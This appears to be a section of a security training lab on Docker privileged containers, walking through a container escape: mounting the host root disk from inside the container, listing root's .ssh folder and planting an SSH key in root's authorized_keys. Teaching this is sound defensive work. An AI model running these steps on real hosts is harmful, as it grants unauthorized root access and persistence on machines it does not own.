### Privileged containers

In this section we will see how to run a privileged container and the consequences this might have.

Execute the following docker command:

```
docker run --rm -it --privileged ubuntu
```

This will:

* Download the latest ubuntu image
* Create a new container
* Open an iterative shell in it

A privileged containers has:

* All capabilities
* Bypasses all AppArmor checks
* Bypasses all cgroup controller checks

Try for instance to enumerate this folder:

```
ls /dev
```

You should see a long list of devices and among them also the root `/` (in AWS xvda1)

#### Exploiting a privileged container

It does not get easier than this:

```
mount /dev/xvda1 /mnt
ls -la /mnt/root/.ssh/
```

Any idea about what we could do next ?

#### Add your SSH public key

Try now, from the container, to add your public SSH key to the root `authorized_keys` file.  

